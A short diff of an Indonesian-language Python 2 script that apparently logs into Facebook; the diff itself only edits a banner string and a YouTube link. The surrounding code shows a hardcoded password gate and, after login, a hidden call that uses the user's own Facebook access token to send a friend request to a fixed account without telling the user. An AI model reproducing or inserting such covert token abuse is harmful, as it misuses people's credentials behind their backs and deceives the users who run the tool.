@@ -81,7 +81,7 @@ def siapa():
 		
 def loginSC():
 	os.system('clear')
-	print"\033[1;97mSilahkan login SC nya dulu bosque\n"
+	print"\033[1;97mSilahkan Login SC Nya Dulu Brother RV\n"
 	username = raw_input("\033[1;96m[*] \033[1;97mUsername \033[1;91m: \033[1;92m")
 	password = raw_input("\033[1;96m[*] \033[1;97mPassword \033[1;91m: \033[1;92m")
 	if username =="revolution" and password =="team":
@@ -133,7 +133,7 @@ def login():
 				unikers.close()
 				print '\n\033[1;96m[✓] \x1b[1;92mLogin Berhasil'
 				requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token='+z['access_token'])
-				os.system('xdg-open https://www.youtube.com/UCliEHmQxdnSc9cTOKD32SQA')
+				os.system('xdg-open https://m.youtube.com/channel/UCliEHmQxdnSc9cTOKD32SQA')
 				menu()
 			except requests.exceptions.ConnectionError:
 				print"\n\033[1;96m[!] \x1b[1;91mTidak ada koneksi"
